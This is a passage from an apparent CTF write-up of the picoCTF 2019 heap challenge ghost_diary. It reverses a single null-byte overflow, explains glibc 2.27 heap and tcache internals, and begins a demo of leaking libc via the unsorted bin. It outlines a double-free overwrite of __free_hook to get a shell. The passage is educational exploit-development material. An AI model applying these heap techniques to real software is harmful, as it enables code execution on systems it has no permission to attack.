I""&<p>I wasn’t initially planning on playing picoCTF 2019, as the challenges are generally extremely easy. That was until one of my friends told me about ghost_diary. Of course I’m down if there are some heap exploitation challenges!</p>

<p>Please use the links below to jump straight to whichever challenge you want to have a look at!</p>

<div class="toc-container">
  <ul id="markdown-toc">
    <li><a href="#ghost_diary" id="markdown-toc-h1-header">ghost_diary</a>
    </li>
    <li><a href="#zero_to_hero" id="markdown-toc-h1-header">zero_to_hero</a>
    </li>
    <li><a href="#sice_cream" id="markdown-toc-h1-header">sice_cream</a>
    </li>
  </ul>
</div>

<h1 id="ghost_diary">ghost_diary</h1>

<p>Disclaimer: This writeup goes into extreme detail, so if you want to instead have a look at <code class="highlighter-rouge">zero_to_hero</code> or <code class="highlighter-rouge">sice_cream</code>, I’d suggest clicking to those from above. Otherwise you’ll have a lot of scrolling to do.</p>

<p>This is a glibc-2.27 heap exploitation challenge with a single NULL byte overflow vulnerability. We have to utilize that to create overlapped chunks in order to be able to get a libc leak as well as perform a double free. The double free will let us to overwrite <code class="highlighter-rouge">__free_hook</code> to a one gadget and get a shell.</p>

<h3 id="challenge"><strong>Challenge</strong></h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 500</li>
  <li><strong>Solves:</strong> 63</li>
</ul>

<blockquote>
  <p>Try writing in this <a href="https://2019shell1.picoctf.com/static/2136859eaddb15400ec3328f017e1df8/ghostdiary">ghost diary</a>. Its also found in /problems/ghost-diary_4_f7e6ee76ec07e6866ddc813917b94545 on the shell server.</p>
</blockquote>

<h3 id="solution"><strong>Solution</strong></h3>

<p>Before you read this writeup, I would highly suggest having some prior knowledge about how the heap works on linux. Linux uses an allocator called <code class="highlighter-rouge">ptmalloc2</code>, and here are some great resources to get you started:</p>

<ul>
  <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction-zh/">ctf-wiki: Extremely detailed information (in Chinese). This one is my favorite, use google translate</a></li>
  <li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">sploitfun: Overview of ptmalloc2</a></li>
  <li><a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_chunk.html">dhavalkapil: Overview + some exploits</a></li>
  <li><a href="https://github.com/shellphish/how2heap">how2heap: Exploits from shellphish</a></li>
  <li><a href="http://blog.infosectcbr.com.au/">InfoSectBR: Some more writeups for some heap exploitation attacks</a></li>
</ul>

<p>I will provide a brief overview of the heap further down, but I will still skip a lot of information and assume that the reader will be using these references to fully understand everything I say.</p>

<h4 id="reversing-the-binary"><strong>Reversing the binary</strong></h4>

<p>Let’s start off by reverse engineering the binary. I first set up an Ubuntu Bionic VM, as that is the environment that the challenge server runs on.</p>

<p>Running <code class="highlighter-rouge">checksec</code> and <code class="highlighter-rouge">file</code> on it shows us the following:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary<span class="nv">$ </span>file ghostdiary
ghostdiary: ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/l, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>da28ccb1f0dd0767b00267e07886470347987ce2, stripped

vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary<span class="nv">$ </span>checksec ghostdiary
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/picoctf-2019/ghost_diary/ghostdiary'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div></div>

<p>So, we have a stripped, dynamically linked 64-bit binary here with all protections enabled. An explanation for each protection is given below:</p>

<ul>
  <li><strong>Full RELRO</strong>: The Global Offset Table (GOT) is read-only, meaning we won’t be able to overwrite a function pointer there and hijack flow of execution easily.</li>
  <li><strong>Canary found</strong>: There is a stack canary, so stack buffer overflows are out of the question unless we can somehow leak the canary.</li>
  <li><strong>NX enabled</strong>: There is no memory region that is both writable and executable, meaning we can’t inject shellcode into the program and have it execute the shellcode.</li>
  <li><strong>PIE enabled</strong>: PIE stands for Position Independent Executable. It means that the base address of the binary is randomized each time we run it, meaning we can’t use exploits such as ROP or ret2libc since we don’t know any addresses at all without a leak.</li>
</ul>

<p>So off the get go we can already see that this won’t be an easy challenge. Fortunately for us, heap exploits don’t care about any of these protections (most of the time at least).</p>

<p>The binary itself is very simple. You should be able to reverse engineer it yourself pretty easily. Note that any code shown below is my interpretation of the assembly code that I’ve gotten after disassembling the binary.</p>

<p>There is a global array of “pages” that can store 19 pages. Each page is a struct that contains a pointer to the page’s content on the heap, as well as the size of the content. The struct looks something like the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">page</span>
<span class="p">{</span>
	<span class="kt">char</span><span class="o">*</span> <span class="n">content</span><span class="p">;</span> <span class="c1">// The actual content of the page</span>
	<span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// The size of the content</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">page</span> <span class="n">array_of_pages</span><span class="p">[</span><span class="mi">19</span><span class="p">];</span> <span class="c1">// Maximum of 19 pages allowed</span>
</code></pre></div></div>

<p>We also have the following functionality:</p>

<ul>
  <li><code class="highlighter-rouge">sub_B5D</code> is the “New page in diary” function. You are allowed to add either a one-sided page or a two-sided page. If you choose a one-sided page, you can allocate a chunk &lt;= 0xf0 in size. If you choose a two-sided page, you can allocate a chunk in between 0x110 and 0x1e0 (inclusive). There is a limit of 19 pages imposed.</li>
  <li><code class="highlighter-rouge">sub_CFB</code> is the “Talk with ghost” function. It lets you edit a page and put your own content into it. This function calls <code class="highlighter-rouge">sub_DA2</code> to read in user input for the content. <code class="highlighter-rouge">sub_DA2</code> has a single null byte overflow vulnerability in it.</li>
  <li><code class="highlighter-rouge">sub_DBE</code> is the “Listen to ghost” function. It outputs the contents of a page.</li>
  <li><code class="highlighter-rouge">sub_E69</code> is the “Burn the page” function. It frees a page and nulls out the pointer in the global array of pages, hence no use-after-free.</li>
</ul>

<p>The only vulnerability we have is a single null byte overflow in <code class="highlighter-rouge">sub_DA2</code>. The “Talk with ghost” (<code class="highlighter-rouge">sub_CFB</code>) function does something like the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">talkWithGhost</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">page_index</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"Page: "</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">page_index</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">page_index</span> <span class="o">&lt;=</span> <span class="mi">19</span> <span class="o">&amp;&amp;</span> <span class="n">global_pages_array</span><span class="p">[</span><span class="n">page_index</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="c1">// Call sub_DA2 to read in the user's input</span>
		<span class="n">sub_DA2</span><span class="p">(</span><span class="n">global_pages_array</span><span class="p">[</span><span class="n">page_index</span><span class="p">].</span><span class="n">content</span><span class="p">,</span> <span class="n">global_pages_array</span><span class="p">[</span><span class="n">page_index</span><span class="p">].</span><span class="n">size</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">sub_DA2</code> does something like the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">sub_DA2</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">chunk_ptr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">num_of_bytes_read</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">index_to_write_to</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="c1">// Ensure size isn't just 0</span>
	<span class="p">{</span>
		<span class="k">while</span> <span class="p">(</span><span class="n">num_of_bytes_read</span> <span class="o">!=</span> <span class="n">size</span><span class="p">)</span> <span class="c1">// Read until size is hit, no heap overflow here</span>
		<span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">// Read a single byte each time</span>
			<span class="p">{</span>
				<span class="n">puts</span><span class="p">(</span><span class="s">"read error"</span><span class="p">);</span>
				<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
			<span class="p">}</span>

			<span class="k">if</span> <span class="p">(</span><span class="n">buf</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="c1">// Quit if the byte read in is a newline</span>
				<span class="k">break</span><span class="p">;</span>

			<span class="c1">// Write to the current index and increment the num_of_bytes_read</span>
			<span class="n">index_to_write_to</span> <span class="o">=</span> <span class="n">num_of_bytes_read</span><span class="o">++</span><span class="p">;</span>
			<span class="n">chunk_ptr</span><span class="p">[</span><span class="n">index_to_write_to</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">chunk_ptr</span><span class="p">[</span><span class="n">num_of_bytes_read</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Null byte overflow here when setting the final byte to '\0'</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The vulnerability is obvious now. If we read the maximum amount of bytes possible, then we will have a single null byte overflow that will overflow into (possibly) the metadata of the next chunk. How do we use this to our advantage?</p>

<p>You may immediately have an <em>idea</em> as to how this vulnerability could be used exploited, but it definitely requires a very in-depth knowledge of the heap to know exactly how to exploit it. I’ll take a quick detour now and provide a brief overview of ptmalloc2, the heap in glibc, and its internals now. Experienced readers can skip this part and go straight to the “Exploitation” section.</p>

<p>I will also skip explaining any information that isn’t required for this challenge, such as the concept of arenas amongst other things.</p>

<p>It will be assumed that the reader has prior knowledge of how stack buffer overflows work. I will use the following link for reference:</p>

<ul>
  <li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding the glibc malloc</a></li>
</ul>

<h3 id="overview-of-the-glibc-heap"><strong>Overview of the glibc heap</strong></h3>

<h4 id="what-is-the-heap">What is the heap?</h4>

<p>The heap is, simply put, a memory region allotted to every program. This memory region can be dynamically allocated, meaning that a program can <strong>request</strong> and <strong>release</strong> memory from the heap whenever it requires. The heap is also a global memory space, meaning it isn’t localized to a function like the stack is. This is mainly accomplished through the use of pointers to reference heap allocations.</p>

<h4 id="how-does-a-program-request-and-release-memory-from-the-heap">How does a program request and release memory from the heap?</h4>

<ul>
  <li><strong>malloc</strong></li>
</ul>

<blockquote>
  <p>A program may use <code class="highlighter-rouge">malloc(size_t n)</code> (and all its different versions such as <code class="highlighter-rouge">calloc</code> and <code class="highlighter-rouge">realloc</code>) to request a chunk of at least <code class="highlighter-rouge">n</code> bytes, or <code class="highlighter-rouge">NULL</code> if no space is available. If <code class="highlighter-rouge">n</code> is zero, malloc returns a minimum-sized chunk (0x10 bytes on most 32-bit systems, and either 0x18 or 0x20 bytes on 64-bit systems). In most systems, <code class="highlighter-rouge">size_t</code> is an unsigned type, so negative values of <code class="highlighter-rouge">n</code> will be interpreted as a request for a huge amount of space, which will often fail.</p>
</blockquote>

<ul>
  <li><strong>free</strong></li>
</ul>

<blockquote>
  <p>A program may use <code class="highlighter-rouge">free(void *p)</code> to release the chunk of memory pointed to by <code class="highlighter-rouge">p</code>. This has no effect if <code class="highlighter-rouge">p</code> is <code class="highlighter-rouge">NULL</code>. It can have very bad effects if <code class="highlighter-rouge">p</code> has already been freed, or if <code class="highlighter-rouge">p</code> is not a malloc’d chunk at all.</p>
</blockquote>

<h4 id="what-does-a-chunk-look-like-in-memory">What does a chunk look like in memory?</h4>

<p>A chunk in memory can either be free, or in-use. Chunks are stored in so-called “arenas”. Each thread gets its own “arena” of chunks, and there is a special arena called the “main arena” which is the very first arena created by a program. This is also the only arena present in single-threaded programs.</p>

<p>A structure called the <code class="highlighter-rouge">malloc_chunk</code> (a pointer to which is typedef’d as <code class="highlighter-rouge">mchunkptr</code>) is used by glibc to keep track of chunks, as follows:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="p">{</span>
  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">mchunk_prev_size</span><span class="p">;</span>  <span class="cm">/* Size of previous chunk (if free).  */</span>
  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">mchunk_size</span><span class="p">;</span>       <span class="cm">/* Size in bytes, including overhead. */</span>

  <span class="cm">/* double links -- used only if free. */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>

  <span class="cm">/* Only used for large blocks: pointer to next larger size.  */</span>
  <span class="cm">/* double links -- used only if free. */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd_nextsize</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk_nextsize</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">mchunkptr</span><span class="p">;</span>
</code></pre></div></div>

<p><strong>Allocated Chunk Visual Structure</strong>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chunk-----&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
mem-------&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre></div></div>

<p><strong>Free Chunk Visual Structure</strong>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chunk-----&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|0|P|
mem-------&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list (fd)        |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list (bk)       |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of current chunk, in bytes                   |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre></div></div>

<p>Free chunks will (depending on their size and glibc version) either maintain themselves in a circular doubly linked list, or a single linked list. As you can see above, the size of a chunk has three bits at the end labeled <code class="highlighter-rouge">A</code>, <code class="highlighter-rouge">M</code>, and <code class="highlighter-rouge">P</code>. These are important:</p>

<ul>
  <li>
    <p><strong>A (NON_MAIN_ARENA)</strong>: 0 for chunks in the main arena. Each thread spawned in a program receives its own arena, and for any chunks malloc’d in each of those threads, this bit is set to 1. The main arena is the arena that is always there prior to any new threads having been spawned in.</p>
  </li>
  <li>
    <p><strong>M (IS_MMAPPED)</strong>: The chunk has been obtained through <code class="highlighter-rouge">mmap</code>. The other two bits are correspondingly ignored if this bit is set to 1, because <code class="highlighter-rouge">mmapped</code> chunks are neither in an arena, nor adjacent to any other free chunks.</p>
  </li>
  <li>
    <p><strong>P (PREV_INUSE)</strong>: Set to 0 when the previous chunk (not the chunk before it in its free-list, but the one before it in memory) is free. The size of that previous free chunk is stored before the size of this current chunk <strong><em>only if</em></strong> the previous chunk is free, otherwise the previous chunk can use that <code class="highlighter-rouge">prev_size</code> space as if it was its own. The very first allocated chunk will always have this bit set. If this bit is set to 1, we cannot determine the previous chunk’s size.</p>
  </li>
</ul>

<p>The most important thing to note here is that freed chunks remain on the heap. They aren’t magically moved out of the heap into some other memory region. They make use of the forward and back pointers to track themselves in the free-lists (called <code class="highlighter-rouge">bins</code>) This means that given a vulnerability such as a heap overflow or a use-after-free (UAF), we can overwrite those forward and back pointers and thus corrupt the free lists. This can be used to our advantage, and if done carefully, can lead to code execution.</p>

<p>The other thing to note is that with something like a double free vulnerability, a freed chunk’s forward pointer would point to itself. We can also utilize this to our advantage, and we will do so in the exploit for this challenge.</p>

<h4 id="bins-and-chunks">Bins and Chunks</h4>

<p>A <code class="highlighter-rouge">bin</code> is glibc’s term for a free-list. It is a singly or doubly linked list of free chunks. Whether it is singly linked or doubly linked depends on the size of the chunks being stored. Bins are differentiated based on the size of chunks that they contain. We have the following 5 bins in glibc 2.27:</p>

<ol>
  <li><strong>Tcache bin</strong> (added with glibc 2.26) for any chunks &lt;= 0x408 bytes in size. It is singly linked. Each tcache bin stores chunks of the same size. Each tcache bin has a max limit of 7 chunks that it can store.</li>
  <li><strong>Fast bin</strong> (not covered in this post, assumed knowledge) for any chunks &lt;= 0x60 bytes in size. There are 10 fast bins, each singly linked.</li>
  <li><strong>Unsorted bin</strong>. Small and large chunks end up in this bin initially when freed. It essentially acts as a cache layer to speed up allocation and deallocation requests. There is only 1 unsorted bin and it is doubly linked.</li>
  <li><strong>Small bin</strong> (not covered in this post, assumed knowledge) for any chunks &lt;= 0x200 bytes in size. Yes, the small bins overlap with the fast bins due to the fact that the fast bins have an upper limit to how many chunks they can store. Small bins are doubly linked.</li>
  <li><strong>Large bin</strong> (not covered in this post, assumed knowledge) for any chunks larger than the upper small chunk limit of 0x200 bytes. Large bins are doubly linked.</li>
</ol>

<p>For information regarding the three bins that are not covered, see <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html">this</a>.</p>

<p>There is also a special chunk called the “top chunk”. This is the chunk that borders the top of an arena. While servicing any allocation requests, it us used as the last resort (i.e space is taken out of the top chunk to service the allocation request). It can also grow using the <code class="highlighter-rouge">sbrk</code> system call. The <code class="highlighter-rouge">PREV_INUSE</code> bit is always set for the top chunk.</p>

<p>When chunks are allocated, there is usually an extra 0x08 or 0x10 bytes added to the size to store the metadata for the chunk. The metadata includes the <code class="highlighter-rouge">prev_size</code> and <code class="highlighter-rouge">size</code> fields of the chunk.</p>

<p>When a chunk is freed, if the chunk ends up in a bin that is <strong><em>not</em></strong> a fast bin nor a tcache bin, then the chunk that comes after it in memory will have its <code class="highlighter-rouge">PREV_INUSE</code> bit set to 0. If it does end up in a tcache bin or a fast bin, the next chunk’s <code class="highlighter-rouge">PREV_INUSE</code> bit does not get set to 0.</p>

<h4 id="introduction-to-tcache">Introduction to Tcache</h4>

<p>I will be referring to the source code of <code class="highlighter-rouge">malloc.c</code> from glibc 2.27, found <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.bz2">here</a>.</p>

<p>Two new data structures were added in glibc 2.26 as shown below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Used to maintain a single free chunk in a tcache bin */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>

<span class="cm">/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_perthread_struct</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span> <span class="c1">// TCACHE_MAX_BINS = 64</span>
<span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>

<span class="k">static</span> <span class="kr">__thread</span> <span class="kt">char</span> <span class="n">tcache_shutting_down</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="cm">/* Used to maintain all free chunks that belong to this current thread's tcache bin.
 * This is stored at the very start of the heap, as soon as the first chunk gets malloc'd in a program
 */</span>
<span class="k">static</span> <span class="kr">__thread</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">tcache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</code></pre></div></div>

<p>To support allocation and deallocation for tcache chunks, two new functions were also added in glibc 2.26:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>

<span class="cm">/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */</span>
<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
<span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p><code class="highlighter-rouge">tcache_get</code> is similar to <code class="highlighter-rouge">__int_malloc</code>, which returns an available chunk to the application. This chunk will come out of the tcache bin.</p>
  </li>
  <li>
    <p><code class="highlighter-rouge">tcache_put</code> is similar to <code class="highlighter-rouge">__int_free</code>, which puts the chunk currently being freed into the tcache bin.</p>
  </li>
  <li>
    <p>The tcache bin is a singly linked list of free chunks. It follows a LIFO structure. There are tcache bins created for each chunk size (0x20, 0x30, 0x40, …), and each tcache bin has a maximum of 7 chunks that it can store.</p>
  </li>
  <li>
    <p>As is also evident from the comments above the two functions above, there are zero security checks performed when freeing or mallocing out of a tcache bin. This, coupled with the fact that a tcache bin of a specific size has a max limit of 7 chunks, is very important to us. Every other bin has security checks to ensure the integrity of itself as well as the chunks it stores, but the tcache does not.</p>
  </li>
  <li>
    <p>Each thread has 64 tcache bins, each holding chunks of the same size. The maximum size chunk that the final tcache bin will hold (on 64-bit systems) is 0x408 bytes.</p>
  </li>
  <li>
    <p>If there is a chunk in a tcache bin and a request is made for a chunk of the same size, then the tcache bin takes priority over all other bins (i.e if there is a chunk of the same size in any of the other bins, they are ignored as the tcache bin is given priority). All bins in general take priority over the top chunk.</p>
  </li>
  <li>
    <p>If a chunk is freed and inserted into a tcache bin, the chunk immediately after this freed chunk (in memory) does <strong><em>not</em></strong> have its <code class="highlighter-rouge">PREV_INUSE</code> bit set to 0.</p>
  </li>
  <li>
    <p>If two adjacent chunks are freed and put into a tcache bin, these chunks do not consolidate together (i.e <code class="highlighter-rouge">malloc_consolidate</code> is never called for tcache chunks).</p>
  </li>
</ul>

<h4 id="the-unsorted-bin">The Unsorted Bin</h4>

<p>The unsorted bin is an optimizing cache layer that got added based on two simple observations. Those being that frees are often clustered together, and that frees are often immediately followed by allocations of similarly sized chunks. In these cases, merges of these freed chunks before putting the resulting larger chunk away in the correct bin would avoid some overhead, and being able to fast-return a recently freed allocation would similarly speed up the whole process.</p>

<p>Whenever a small or a large chunk is freed, they will initially be inserted into the unsorted bin. In glibc versions 2.26+, the only constraint is that if a small chunk is freed, the corresponding sized tcache bin must be full, otherwise the chunk will just end up in that tcache bin.</p>

<p>The reason the unsorted bin is important to us is because as soon as a chunk goes into the unsorted bin, a pointer to the unsorted bin (which exists within libc) is inserted into the forward and back pointers of that free chunk.</p>

<p>We can easily cause this by first filling up a tcache bin of a small size (i.e &lt;= 0x200 bytes in size) with 7 chunks, then freeing a chunk of that same size one more time. This 8th and final free will cause the chunk to go into the unsorted bin due to the tcache bin being full. If you then have a UAF vulnerability, you can read this libc pointer and get an info leak, which lets you defeat both PIE and ASLR. An example is given below.</p>

<p>If you want to demo the code below, you must use either glibc version 2.26 or 2.27:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">chunks</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>

	<span class="c1">// Allocate 8 chunks of size 0x80</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="c1">// Allocate one more chunk to prevent the unsorted bin chunk from being consolidated</span>
	<span class="c1">// with the top chunk after it's freed</span>
	<span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>

